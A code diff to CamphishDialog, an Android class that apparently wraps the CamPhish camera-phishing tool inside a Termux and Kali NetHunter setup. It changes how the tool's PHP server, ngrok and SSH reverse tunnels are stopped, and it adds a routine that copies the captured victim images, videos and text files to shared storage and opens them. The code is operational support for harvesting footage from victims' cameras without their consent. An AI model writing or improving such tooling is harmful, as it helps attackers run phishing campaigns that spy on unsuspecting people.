@@ -42,6 +42,24 @@ public class CamphishDialog extends BaseDialogCentre {
         super(context);
     }
 
+    private void sendCtrlCToSession(String sessionName) {
+        if (mContext instanceof TermuxActivity) {
+            TermuxActivity activity = (TermuxActivity) mContext;
+            TermuxService mTermuxService = activity.mTermuxService;
+            
+            if (mTermuxService != null) {
+                List<com.termux.shared.termux.shell.command.runner.terminal.TermuxSession> sessions = mTermuxService.getTermuxSessions();
+                for (int i = 0; i < sessions.size(); i++) {
+                    TerminalSession session = sessions.get(i).getTerminalSession();
+                    if (sessionName.equals(session.mSessionName)) {
+                        session.write("\003"); // Send Ctrl+C
+                        return;
+                    }
+                }
+            }
+        }
+    }
+
     @Override
     void initViewDialog(View mView) {
         editTextNgrokToken = mView.findViewById(R.id.editTextNgrokToken);
@@ -62,12 +80,8 @@ public class CamphishDialog extends BaseDialogCentre {
         buttonViewFiles.setOnClickListener(v -> viewCapturedFiles());
 
         buttonStop.setOnClickListener(v -> {
-            // Stop main.py, php, ngrok
-            // 优先使用 SIGINT (模拟 Ctrl+C)
-            String stopCmd = "pkill -SIGINT -f 'python3 main.py' || kill -2 $(pgrep -f 'python3 main.py') || pkill -f 'python3 main.py' || pkill -9 -f 'python3 main.py'; " +
-                             "pkill -f 'php -S 0.0.0.0:8080'; " +
-                             "pkill -f 'ngrok http'";
-            executeInRootKali(stopCmd, "Kali-CamPhish");
+            // 发送 Ctrl+C 到 Kali-CamPhish 会话
+            sendCtrlCToSession("Kali-CamPhish");
         });
         
         buttonTunnelStart.setOnClickListener(v -> {
@@ -78,13 +92,12 @@ public class CamphishDialog extends BaseDialogCentre {
         });
 
         buttonTunnelStop.setOnClickListener(v -> {
-             // 优先使用 SIGINT (模拟 Ctrl+C)
-             String stopCmd = "pkill -SIGINT -f 'ssh -R 80:localhost' || kill -2 $(pgrep -f 'ssh -R 80:localhost') || pkill -f 'ssh -R 80:localhost'";
-             executeInRootKali(stopCmd, "Kali-Tunnel");
+             // 发送 Ctrl+C 到 Kali-Tunnel 会话
+             sendCtrlCToSession("Kali-Tunnel");
         });
         
         // 初始化时启用停止按钮，以防用户之前已经启动了进程但重启了 APP
-        // 这里简单处理，总是允许点击停止。更完善的做法是检查进程是否存在。
+        // 允许用户随时点击停止，以确保可以清理后台进程
         buttonStop.setEnabled(true);
         buttonStop.setAlpha(1.0f);
         if (stopHintText != null) stopHintText.setVisibility(View.GONE);
@@ -97,6 +110,7 @@ public class CamphishDialog extends BaseDialogCentre {
             TermuxTerminalSessionActivityClient mTermuxTerminalSessionActivityClient = activity.mTermuxTerminalSessionActivityClient;
             
             TerminalSession targetSession = null;
+            boolean isNewSession = false;
 
             if (mTermuxService != null) {
                 List<com.termux.shared.termux.shell.command.runner.terminal.TermuxSession> sessions = mTermuxService.getTermuxSessions();
@@ -113,46 +127,77 @@ public class CamphishDialog extends BaseDialogCentre {
                 mTermuxTerminalSessionActivityClient.setCurrentSession(targetSession);
             } else {
                 mTermuxTerminalSessionActivityClient.addNewSession(false, sessionName);
+                isNewSession = true;
             }
 
             if (TermuxActivity.mTerminalView != null) {
-                TermuxActivity.mTerminalView.sendTextToTerminal("nethunter -r\n");
+                // 只有在新会话时才进入 NetHunter 环境，避免重复执行 nethunter -r 导致嵌套
+                if (isNewSession) {
+                    TermuxActivity.mTerminalView.sendTextToTerminal("nethunter -r\n");
+                    // 等待 NetHunter 环境加载，这只是一个简单的延时策略，更稳健的方式是检测提示符，但这里只能盲发
+                    // 注意：这里的延时是无法通过 sleep 实现的，因为这是 UI 线程发送文本。
+                    // 我们可以假设用户不会在极短时间内连续操作导致问题，或者依赖命令队列。
+                }
+                
+                // 执行命令
                 TermuxActivity.mTerminalView.sendTextToTerminal(command + "\n");
             }
         }
     }
 
     private void viewCapturedFiles() {
-        String sdcardPath = Environment.getExternalStorageDirectory().getPath() + "/ZeroTermux/CamPhish";
-        String copyCmd = "mkdir -p " + sdcardPath + " && cp -rf /usr/share/camphish/uploads/* " + sdcardPath + "/";
+        // 使用 /sdcard 路径，这在 NetHunter 和 Android 之间是通用的
+        String sdcardPath = "/sdcard/Termux-x/CamPhish";
         
-        executeInRootKali(copyCmd, "Kali-CamPhish");
+        // 使用 find 命令查找并复制，防止路径差异或文件在子目录中
+        // 同时处理 .jpg, .png, .txt 和 .webm (视频)
+        String copyCmd = "mkdir -p " + sdcardPath + " && " +
+                         "find /usr/share/camphish -type f \\( -name \"*.jpg\" -o -name \"*.png\" -o -name \"*.txt\" -o -name \"*.webm\" \\) -exec cp -f {} " + sdcardPath + "/ \\;";
         
-        Toast.makeText(mContext, "正在导出文件到: " + sdcardPath, Toast.LENGTH_SHORT).show();
+        // 使用 "Kali-Helper" 会话，避免干扰正在运行 CamPhish 主程序的 "Kali-CamPhish" 会话
+        executeInRootKali(copyCmd, "Kali-Helper");
         
-        FileListDialog dialog = new FileListDialog(mContext);
-        dialog.setTitleText("CamPhish 捕获文件");
-        File dir = new File(sdcardPath);
-        if (!dir.exists()) dir.mkdirs();
-        dialog.setFilePath(dir);
+        Toast.makeText(mContext, "正在导出文件，请稍后...", Toast.LENGTH_SHORT).show();
         
-        dialog.setOnItemFileClickListener(file -> {
-             try {
-                 // Try to open file using system intent
-                 android.os.StrictMode.VmPolicy.Builder builder = new android.os.StrictMode.VmPolicy.Builder();
-                 android.os.StrictMode.setVmPolicy(builder.build());
-                 
-                 Intent intent = new Intent(Intent.ACTION_VIEW);
-                 Uri uri = Uri.fromFile(file);
-                 intent.setDataAndType(uri, "image/*"); 
-                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                 mContext.startActivity(intent);
-             } catch (Exception e) {
-                 Toast.makeText(mContext, "无法打开文件: " + e.getMessage(), Toast.LENGTH_SHORT).show();
-             }
-        });
-        
-        dialog.show();
+        // 延迟显示对话框，给文件复制一点时间
+        new android.os.Handler().postDelayed(() -> {
+            FileListDialog dialog = new FileListDialog(mContext);
+            dialog.setTitleText("CamPhish 捕获文件");
+            // 对于 Android 端读取，我们需要完整的绝对路径
+            File dir = new File(Environment.getExternalStorageDirectory(), "Termux-x/CamPhish");
+            if (!dir.exists()) dir.mkdirs();
+            dialog.setFilePath(dir);
+            
+            dialog.setOnItemFileClickListener(file -> {
+                 try {
+                     // Try to open file using system intent
+                     android.os.StrictMode.VmPolicy.Builder builder = new android.os.StrictMode.VmPolicy.Builder();
+                     android.os.StrictMode.setVmPolicy(builder.build());
+                     
+                     Intent intent = new Intent(Intent.ACTION_VIEW);
+                     Uri uri = Uri.fromFile(file);
+                     
+                     // Determine MIME type based on file extension
+                     String mimeType = "*/*";
+                     String fileName = file.getName().toLowerCase();
+                     if (fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") || fileName.endsWith(".png")) {
+                         mimeType = "image/*";
+                     } else if (fileName.endsWith(".mp4") || fileName.endsWith(".avi") || fileName.endsWith(".mkv") || fileName.endsWith(".webm")) {
+                         mimeType = "video/*";
+                     } else if (fileName.endsWith(".txt")) {
+                         mimeType = "text/plain";
+                     }
+                     
+                     intent.setDataAndType(uri, mimeType); 
+                     intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                     mContext.startActivity(intent);
+                 } catch (Exception e) {
+                     Toast.makeText(mContext, "无法打开文件: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+                 }
+            });
+            
+            dialog.show();
+        }, 1500); // 1.5秒延迟
     }
 
     private void updateCamPhish() {
